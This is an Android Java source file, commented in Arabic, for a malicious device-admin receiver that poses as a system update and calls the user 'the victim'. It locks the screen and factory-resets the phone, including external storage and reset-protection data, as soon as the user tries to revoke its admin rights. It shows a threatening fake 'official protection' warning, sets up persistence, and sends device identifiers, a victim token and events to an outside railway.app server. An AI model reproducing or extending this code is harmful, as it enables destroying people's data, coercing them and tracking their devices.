package com.sec.check;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * AdminReceiver - قلب الحماية في المشروع
 * ============================================================
 * الوظائف:
 * 1. تفعيل Device Admin (لحماية التطبيق من الحذف)
 * 2. مراقبة محاولات إلغاء التفعيل (Disable Requested)
 * 3. تنفيذ Factory Reset (Wipe Data) عند محاولة الحذف
 * 4. الإبلاغ عن أي محاولة إلغاء تفعيل للسيرفر
 * ============================================================
 */
public class AdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "SystemUpdate";
    private static final String PREFS_NAME = "sys_prefs";
    private static final String KEY_UNINSTALL_ATTEMPTS = "uninstall_attempts";
    private static final String KEY_LAST_WARNING = "last_warning_time";
    private static final String KEY_FACTORY_RESET_TRIGGERED = "factory_reset_triggered";

    // ★★★ سيرفر الإبلاغ ★★★
    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";

    // ★★★ الحد الأقصى لمحاولات إلغاء التفعيل قبل الضبط ★★★
    private static final int MAX_WARNINGS_BEFORE_WIPE = 1;

    // ============================================================
    // onEnabled - عندما يتم تفعيل Device Admin
    // ============================================================
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d(TAG, "[ADMIN] ★ Device Admin ENABLED ★");

        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit()
                    .putBoolean("admin_enabled", true)
                    .putLong("admin_enabled_at", System.currentTimeMillis())
                    .putInt(KEY_UNINSTALL_ATTEMPTS, 0)
                    .apply();

            new Thread(() -> reportToServer(context, "admin_enabled", null)).start();

            try {
                Intent svc = new Intent(context, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(svc);
                } else {
                    context.startService(svc);
                }
            } catch (Exception e) {
                Log.e(TAG, "[ADMIN] start service error: " + e.getMessage());
            }

            try {
                PersistenceManager.enableAllPersistence(context);
                PersistenceManager.scheduleEternalAlarm(context);
            } catch (Exception e) {
                Log.e(TAG, "[ADMIN] persistence error: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onEnabled error: " + e.getMessage());
        }
    }

    // ============================================================
    // onDisableRequested - ★★★ الأهم: عندما يحاول الضحية إلغاء التفعيل ★★★
    // ============================================================
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        Log.d(TAG, "[ADMIN] !!! DISABLE REQUESTED — COUNTER-ATTACK !!!");

        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);

            int attempts = prefs.getInt(KEY_UNINSTALL_ATTEMPTS, 0) + 1;
            long now = System.currentTimeMillis();

            prefs.edit()
                    .putInt(KEY_UNINSTALL_ATTEMPTS, attempts)
                    .putLong(KEY_LAST_WARNING, now)
                    .apply();

            Log.d(TAG, "[ADMIN] Uninstall attempt #" + attempts);

            new Thread(() -> reportToServer(context, "uninstall_attempt",
                    "attempt_" + attempts)).start();

            // ★★★ قفل الشاشة فورًا ★★★
            try {
                DevicePolicyManager dpm = (DevicePolicyManager)
                        context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (dpm != null) {
                    dpm.lockNow();
                }
            } catch (Exception e) {
                Log.e(TAG, "[ADMIN] lockNow error: " + e.getMessage());
            }

            // ★★★ تنفيذ الضبط المصنعي ★★★
            if (attempts >= MAX_WARNINGS_BEFORE_WIPE) {
                Log.d(TAG, "[ADMIN] ★★★ MAX ATTEMPTS — EXECUTING FACTORY RESET ★★★");

                try {
                    prefs.edit()
                            .putBoolean(KEY_FACTORY_RESET_TRIGGERED, true)
                            .apply();

                    new Thread(() -> reportToServer(
                            context, "factory_reset_executing",
                            "attempts=" + attempts)).start();

                    final Context ctx = context.getApplicationContext();
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            DevicePolicyManager dpm2 = (DevicePolicyManager)
                                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                            if (dpm2 != null) {
                                int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                        | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
                                dpm2.wipeData(flags);
                                Log.d(TAG, "[ADMIN] ★★★ WIPE EXECUTED ★★★");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "[ADMIN] wipeData error: " + e.getMessage());
                        }
                    }, 3000);

                } catch (Exception e) {
                    Log.e(TAG, "[ADMIN] factory reset prep error: " + e.getMessage());
                }
            }

            // ★★★ الرسالة التحذيرية للضحية ★★★
            return "⚠️ تحذير نهائي من نظام الحماية ⚠️\n\n"
                    + "هذا التطبيق جزء من نظام الحماية الرسمي للجهاز.\n\n"
                    + "لا يمكن إلغاء تفعيل مسؤول النظام إلا بكلمة سر الشركة.\n\n"
                    + "⚠️ أي محاولة لإلغاء التفعيل أو حذف التطبيق\n"
                    + "ستؤدي إلى مسح كامل لبيانات الجهاز فورًا!\n\n"
                    + "للاستفسار: support@system-update.com\n"
                    + "الرمز السري: XZP-9846";

        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onDisableRequested error: " + e.getMessage());
            return "لا يمكن إلغاء التفعيل. أي محاولة ستؤدي لمسح الجهاز.";
        }
    }

    // ============================================================
    // onDisabled - ★★★ عندما يتم إلغاء التفعيل فعليًا ★★★
    // ============================================================
    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d(TAG, "[ADMIN] !!! ★★★ DISABLED ★★★ — NUCLEAR OPTION");

        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);
            boolean alreadyTriggered = prefs.getBoolean(
                    KEY_FACTORY_RESET_TRIGGERED, false);

            new Thread(() -> reportToServer(
                    context, "admin_disabled", "nuclear_option")).start();

            if (!alreadyTriggered) {
                Log.d(TAG, "[ADMIN] Executing emergency wipe...");
                try {
                    DevicePolicyManager dpm = (DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                    if (dpm != null) {
                        int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
                        dpm.wipeData(flags);
                        Log.d(TAG, "[ADMIN] ★★★ EMERGENCY WIPE EXECUTED ★★★");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "[ADMIN] wipeData error: " + e.getMessage());
                }
            }

            try {
                Intent svc = new Intent(context, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(svc);
                } else {
                    context.startService(svc);
                }
            } catch (Exception ignored) {}

        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onDisabled error: " + e.getMessage());
        }
    }

    // ============================================================
    // onPasswordFailed - حماية إضافية
    // ============================================================
    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        Log.d(TAG, "[ADMIN] Password failed");

        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);
            int failedAttempts = prefs.getInt("password_failed_count", 0) + 1;
            prefs.edit().putInt("password_failed_count", failedAttempts).apply();

            if (failedAttempts >= 10) {
                Log.d(TAG, "[ADMIN] ★★★ TOO MANY FAILED PASSWORDS — WIPING ★★★");
                try {
                    DevicePolicyManager dpm = (DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                    if (dpm != null) {
                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "[ADMIN] wipeData error: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onPasswordFailed error: " + e.getMessage());
        }
    }

    // ============================================================
    // onPasswordSucceeded - تصفير العداد
    // ============================================================
    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        super.onPasswordSucceeded(context, intent);
        try {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putInt("password_failed_count", 0)
                    .apply();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // onPasswordChanged
    // ============================================================
    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        Log.d(TAG, "[ADMIN] Password changed");
        try {
            new Thread(() -> reportToServer(
                    context, "password_changed", null)).start();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // onReceive - استقبال كل الأحداث
    // ★★★ تم استخدام الثوابت الصحيحة من DeviceAdminReceiver ★★★
    // ============================================================
    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);

        try {
            String action = intent != null ? intent.getAction() : "unknown";
            Log.d(TAG, "[ADMIN] onReceive: " + action);

            if (intent != null) {
                // ★★★ الثوابت الصحيحة موجودة في DeviceAdminReceiver ★★★
                if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED
                        .equals(action)) {
                    Log.d(TAG, "[ADMIN] Disable requested via onReceive");
                } else if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_DISABLED
                        .equals(action)) {
                    Log.d(TAG, "[ADMIN] Disabled via onReceive");
                } else if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_ENABLED
                        .equals(action)) {
                    Log.d(TAG, "[ADMIN] Enabled via onReceive");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onReceive error: " + e.getMessage());
        }
    }

    // ============================================================
    // Helper: تقرير للسيرفر
    // ============================================================
    private void reportToServer(Context context, String event, String extra) {
        HttpURLConnection conn = null;
        try {
            String token = "DEFAULT_TOKEN";
            try {
                token = BuildConfig.VICTIM_TOKEN;
            } catch (Exception ignored) {}

            String deviceId = "unknown";
            try {
                deviceId = android.provider.Settings.Secure.getString(
                        context.getContentResolver(),
                        android.provider.Settings.Secure.ANDROID_ID);
            } catch (Exception ignored) {}

            JSONObject payload = new JSONObject();
            payload.put("type", "admin_event");
            payload.put("event", event);
            payload.put("extra", extra != null ? extra : "");
            payload.put("token", token);
            payload.put("device", deviceId);
            payload.put("model", Build.MODEL);
            payload.put("brand", Build.BRAND);
            payload.put("android", Build.VERSION.RELEASE);
            payload.put("sdk", Build.VERSION.SDK_INT);
            payload.put("timestamp", System.currentTimeMillis());

            URL url = new URL(SERVER_URL + "/apk/victim/data");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int rc = conn.getResponseCode();
            Log.d(TAG, "[REPORT] " + event + " → HTTP " + rc);

        } catch (Exception e) {
            Log.e(TAG, "[REPORT] error: " + e.getMessage());
        } finally {
            try {
                if (conn != null) conn.disconnect();
            } catch (Exception ignored) {}
        }
    }
                            }
